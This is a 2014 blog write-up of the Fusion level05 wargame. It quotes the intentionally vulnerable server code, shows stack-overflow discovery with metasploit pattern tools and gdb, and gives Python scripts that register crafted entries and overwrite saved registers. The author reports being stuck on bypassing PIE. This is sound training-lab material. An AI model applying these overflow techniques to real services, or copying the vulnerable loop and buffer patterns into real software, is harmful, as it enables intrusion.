+++
author = "pwntester"
categories = ["post"]
date = 2014-04-20T10:57:00Z
description = ""
draft = false
slug = "crowd-solving-fusion-level05"
tags = ["post"]
title = "Crowd-Solving Fusion level05"

+++


I played with Fusion level05 for a couple of days last Xmas and although I found how to smash the stack, I couldn't find any reliable way of leaking the .text base address to bypass PIE protection so I left it there. Yesterday, a tweet from [@Newlog_](https://twitter.com/Newlog_) got me thinking it could be a good idea to post what I've done so far in case anyone wants to pick it from there and help solving the level. Lets call this crowd-solving :-D

So lets get the ball rolling:

In [level05](http://exploit-exercises.com/fusion/level05) we are given the following server code:

```lang-clike line-numbers 
#include "../common/common.c"

#include <task.h>

#define STACK (4096 * 8)

unsigned int hash(unsigned char *str, int length, unsigned int mask)
{
  unsigned int h = 0xfee13117;
  int i;

  for(h = 0xfee13117, i = 0; i < length; i++) {
    h ^= str[i];
    h += (h << 11);
    h ^= (h >> 7);
    h -= str[i];
  }
  h += (h << 3);
  h ^= (h >> 10);
  h += (h << 15);
  h -= (h >> 17);

  return (h & mask);
}

void fdprintf(int fd, char *fmt, ...)
{
  va_list ap;
  char *msg = NULL;

  va_start(ap, fmt);
  vasprintf(&msg, fmt, ap);
  va_end(ap);

  if(msg) {
    fdwrite(fd, msg, strlen(msg));
    free(msg);
  }
}

struct registrations {
  short int flags;
  in_addr_t ipv4;
} __attribute__((packed));

#define REGDB (128)
struct registrations registrations[REGDB];

static void addreg(void *arg)
{
  char *name, *sflags, *ipv4, *p;
  int h, flags;
  char *line = (char *)(arg);

  name = line;
  p = strchr(line, ' ');
  if(! p) goto bail;
  *p++ = 0;
  sflags = p;
  p = strchr(p, ' ');
  if(! p) goto bail;
  *p++ = 0;
  ipv4 = p;

  flags = atoi(sflags);
  if(flags & ~0xe0) goto bail;

  h = hash(name, strlen(name), REGDB-1);
  registrations[h].flags = flags;
   registrations[h].ipv4 = inet_addr(ipv4);

  printf("registration added successfully\n");

bail:
  free(line);
}

static void senddb(void *arg)
{
  unsigned char buffer[512], *p;
  char *host, *l;
  char *line = (char *)(arg);
  int port;
  int fd;
  int i;
  int sz;

  p = buffer;
  sz = sizeof(buffer);
  host = line;
  l = strchr(line, ' ');
  if(! l) goto bail;
  *l++ = 0;
  port = atoi(l);
  if(port == 0) goto bail;

  printf("sending db\n");

  if((fd = netdial(UDP, host, port)) < 0) goto bail;

  for(sz = 0, p = buffer, i = 0; i < REGDB; i++) {
    if(registrations[i].flags | registrations[i].ipv4) {
      memcpy(p, &registrations[i], sizeof(struct registrations));
      p += sizeof(struct registrations);
      sz += sizeof(struct registrations);
    }
  }
bail:
  fdwrite(fd, buffer, sz);
  close(fd);
  free(line);
}

int get_and_hash(int maxsz, char *string, char separator)
{
  char name[32];
  int i;

  if(maxsz > 32) return 0;

  for(i = 0; i < maxsz, string[i]; i++) {
    if(string[i] == separator) break;
    name[i] = string[i];
  }

  return hash(name, strlen(name), 0x7f);
}


struct isuparg {
  int fd;
  char *string;
};


static void checkname(void *arg)
{
  struct isuparg *isa = (struct isuparg *)(arg);
  int h;

  h = get_and_hash(32, isa->string, '@');

  fdprintf(isa->fd, "%s is %sindexed already\n", isa->string, registrations[h].ipv4 ? "" : "not ");

}

static void isup(void *arg)
{
  unsigned char buffer[512], *p;
  char *host, *l;
  struct isuparg *isa = (struct isuparg *)(arg);
  int port;
  int fd;
  int i;
  int sz;

  // skip over first arg, get port
  l = strchr(isa->string, ' ');
  if(! l) return;
  *l++ = 0;

  port = atoi(l);
  host = malloc(64);

  for(i = 0; i < 128; i++) {
    p = (unsigned char *)(& registrations[i]);
    if(! registrations[i].ipv4) continue;

    sprintf(host, "%d.%d.%d.%d",
      (registrations[i].ipv4 >> 0) & 0xff,
      (registrations[i].ipv4 >> 8) & 0xff,
      (registrations[i].ipv4 >> 16) & 0xff,
      (registrations[i].ipv4 >> 24) & 0xff);

    if((fd = netdial(UDP, host, port)) < 0) {
      continue;
    }

    buffer[0] = 0xc0;
    memcpy(buffer + 1, p, sizeof(struct registrations));
    buffer[5] = buffer[6] = buffer[7] = 0;

    fdwrite(fd, buffer, 8);

    close(fd);
  }

  free(host);
}

static void childtask(void *arg)
{
  int cfd = (int)(arg);
  char buffer[512], *n;
  int r;


  n = "** welcome to level05 **\n";

  if(fdwrite(cfd, n, strlen(n)) < 0) goto bail;

  while(1) {
    if((r = fdread(cfd, buffer, 512)) <= 0) goto bail;

    n = strchr(buffer, '\r');
    if(n) *n = 0;
    n = strchr(buffer, '\n');
    if(n) *n = 0;

    if(strncmp(buffer, "addreg ", 7) == 0) {
      taskcreate(addreg, strdup(buffer + 7), STACK);
      continue;
    }

    if(strncmp(buffer, "senddb ", 7) == 0) {
      taskcreate(senddb, strdup(buffer + 7), STACK);
      continue;
    }

    if(strncmp(buffer, "checkname ", 10) == 0) {
      struct isuparg *isa = calloc(sizeof(struct isuparg), 1);

      isa->fd = cfd;
      isa->string = strdup(buffer + 10);

      taskcreate(checkname, isa, STACK);
      continue;
    }

    if(strncmp(buffer, "quit", 4) == 0) {
      break;
    }

    if(strncmp(buffer, "isup ", 5) == 0) {
      struct isuparg *isa = calloc(sizeof(struct isuparg), 1);
      isa->fd = cfd;
      isa->string = strdup(buffer + 5);
      taskcreate(isup, isa, STACK);
    }
  }

bail:
  close(cfd);
}

void taskmain(int argc, char **argv)
{
  int fd, cfd;
  char remote[16];
  int rport;

  signal(SIGPIPE, SIG_IGN);
  background_process(NAME, UID, GID);

  if((fd = netannounce(TCP, 0, PORT)) < 0) {
    fprintf(stderr, "failure on port %d: %s\n", PORT, strerror(errno));
    taskexitall(1);
  }

  fdnoblock(fd);

  while((cfd = netaccept(fd, remote, &rport)) >= 0) {
    fprintf(stderr, "accepted connection from %s:%d\n", remote, rport);
    taskcreate(childtask, (void *)(cfd), STACK);
  }



}
```

The server takes different commands as input:

* addreg [name] [flags] [ip]: Register an IP with a given flags (32,96 or 224) and store it in an array with an index provided by a custom hash function of the given name
* senddb [ip] [port]: Sends all the registered IPs to the given ip and port using UDP
* isup [skipped] [port]: Loop through all the ips registered and for those with a valid ip, it sends the details to that ip and the provided port
* checkname [name]: Calculate the custom hash of the given name and checks if the registration array contains a valid ip for that hash
* quit: Exit

There are a couple of overflows that we can abuse:

The first one is on `get_and_hash`  "for" loop:

```lang-clike line-numbers 
for(i = 0; i < maxsz, string[i]; i++) {
  if(string[i] == separator) break;
   name[i] = string[i];
}
```

The loop wont stop at `maxsz` allowing writing beyond the limits of the "name" buffer (32). We can quickly verify this using **metasploit** to find the right overflow offet:

```lang-bash line-numbers 
fusion@fusion:~$ /opt/metasploit-framework/tools/pattern_create.rb 64
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A
```

```lang-bash line-numbers 
fusion@fusion:~$ nc localhost 20005
** welcome to level05 **
checkname Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A
```

Monitoring the process with gdb we get:

```lang-bash line-numbers 
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x35624134 in ?? ()
```

That corresponds to offset 44:

```lang-bash line-numbers 
fusion@fusion:~$ /opt/metasploit-framework/tools/pattern_offset.rb 35624134
44
```

This allows us to write beyond "name" buffer limits and into the stored base pointer and instruction pointer. Actually looks like a nice place to place our payload:

```lang-bash line-numbers 
(gdb) x/100wx $esp
0xb940cc6c:	0x44444444	0x42424242	0x42424242	0x42424242
0xb940cc7c:	0x42424242	0x42424242	0x42424242	0x42424242
0xb940cc8c:	0x42424242	0x42424242	0x42424242	0x42424242
0xb940cc9c:	0x42424242	0x42424242	0x42424242	0x42424242
0xb940ccac:	0x42424242	0x42424242	0x42424242	0x42424242
0xb940ccbc:	0x42424242	0x42424242	0x42424242	0x42424242
0xb940cccc:	0x42424242	0x42424242	0x42424242	0x42424242
0xb940ccdc:	0x42424242	0x42424242	0x42424242	0x42424242
0xb940ccec:	0x42424242	0x42424242	0x42424242	0x42424242
0xb940ccfc:	0x42424242	0x42424242	0x42424242	0x42424242
0xb940cd0c:	0x42424242	0x42424242	0x42424242	0x42424242
0xb940cd1c:	0x42424242	0x42424242	0x42424242	0x42424242
0xb940cd2c:	0x42424242	0x42424242	0x42424242	0x00000000
```

There is another overflow that we cannot exploit since there is a call to `free(line)` before returning from the function that crash the application. This one is in the `senddb` function:

```lang-bash line-numbers 
unsigned char buffer[512], *p;
..
..
for(sz = 0, p = buffer, i = 0; i < REGDB; i++) {
  if(registrations[i].flags | registrations[i].ipv4) {
    memcpy(p, &registrations[i], sizeof(struct registrations));
    p += sizeof(struct registrations);
    sz += sizeof(struct registrations);
  }
}
bail:
  fdwrite(fd, buffer, sz);
  close(fd);
  free(line);
```

`buffer` is 512 bytes long but we can overwrite it with 128 (REGDB) registrations which are 6 bytes long each. So with 85 of them we can overwrite the destination buffer.
The problem is that `line` will also be affected and the call to `free(line)` will segfault before getting to `ret`

This was one of the first vectors I tried to use to leak the binary base address since we can overwrite some registers before crashing that could leak the base address plus a fixed offset. However there is no difference in the application behaviour that we can use to know if we overwrote those register bytes with the right values or not (as we did for [level04](http://www.pwntester.com/blog/2013/12/31/fusion-level04-write-up/))

Anyway if someone wants to give it a try they will first need to set up a listener for the info coming from the `senddb` fdwrite function. I wrote this listener that works on port 6666/UDP and that works for `senddb` and `isup` commands:

```lang-python line-numbers 
#!/usr/bin/python

from socket import *
from struct import *

s = socket(AF_INET, SOCK_DGRAM)
s.bind(('0.0.0.0', 6666))
while True:
    data =  s.recv(1024)
    print("[+] Received UDP packet with length {0}: {1}".format(len(data), data.encode("hex")))
    if data[:1].encode("hex") == "c0":
        print("[+] Received ISUP packet {0}".format(data.encode("hex")))
        print("[+]   Control char: " + data[:1].encode("hex"))
        flags = unpack("<H", data[1:3])[0]
        print("[+]   Flags: {0}".format(int(flags),16))
        # Not printing the ip since we miss a byte and since it will always be our own ip otherwise we could not receive it
        #reg = unpack("<I", data[3:7])[0]
        #print("[+]   3 bytes from address: {0}".format(reg))
    else:
        i = 0
        print("[+] Received SENDDB packet with {0} registrations".format(len(data)/6))
        while i < len(data):
                reg = data[i:i+6]
                print("[+] Received SENDDB packet {0}".format(reg.encode("hex")))
                flags = unpack("<H", reg[0:2])[0]
                print("[+]   Flags: {0}".format(int(flags),16))
                host = unpack("<I", reg[2:6])[0]
                print("[+]   Host ({2}) IP: {0} ({1})".format(inet_ntoa(reg[2:6]),reg[2:6].encode("hex"),(i+6)/6))
                i += 6
```

Using this listener and the following bruteforce client script, we can find which names generate the right hashes to overwrite ebp, ebx, eip ...

```lang-python line-numbers 
#!/usr/bin/python

from socket import *
from struct import *

s = socket(AF_INET, SOCK_STREAM)
s.connect(("localhost", 20005))
for i in xrange(139):
        if i == 84:
                # EBP
                payload = "addreg {0} 32 {1}\n".format(i,inet_ntoa("\x44\x44\x44\x44"))
        elif i == 50:
                # EBX
                payload = "addreg {0} 32 {1}\n".format(i,inet_ntoa("\x41\x41\x41\x41"))
        else:
                payload = "addreg {0} 32 127.0.0.{0}\n".format(i)
        s.send(payload)
s.send("senddb 127.0.0.1 6666\n")
s.close()
```

Running the script will get us the following packets in our listener:

```lang-bash line-numbers 
fusion@fusion:~$ python fusion05-senddb.py
..
..
[+]   Host (86) IP: 127.0.0.70 (7f000046)
[+]   Host (87) IP: 127.0.0.69 (7f000045)
[+]   Host (88) IP: 127.0.0.137 (7f000089)
[+]   Host (89) IP: 65.65.65.65 (41414141)
[+]   Host (90) IP: 127.0.0.87 (7f000057)
[+]   Host (91) IP: 68.68.68.68 (44444444)
```

It turns out that we need 139 different "names" to produce 91 unique hashes that are the ones required to overflow the buffer (not 85 as we calculated)
The problem is that the 91 registration also overwrites the argument to `free(line)` as shown in GDB right before calling `free()`

In the first overflow (the `get_and_hash()` one), we overwrite `esi` and `edi` which change on every request before overwriting `ebp` and `eip`. Overwriting `ebp` byte a byte can leak the binary load offset but in order to do so we have to overwrite `esi` with an address with write permissions (since "checkname" contains the following instruction after leaving `get_and_hash`: `<checkname+107>: mov (%esi),%eax`) and even guessing a good one, overwriting `ebp` does not change the server behaviour to make educated guesses about the right `ebp` value. So this looks like a dead end for my newbie skills.

So here I am stucked, any ideas?







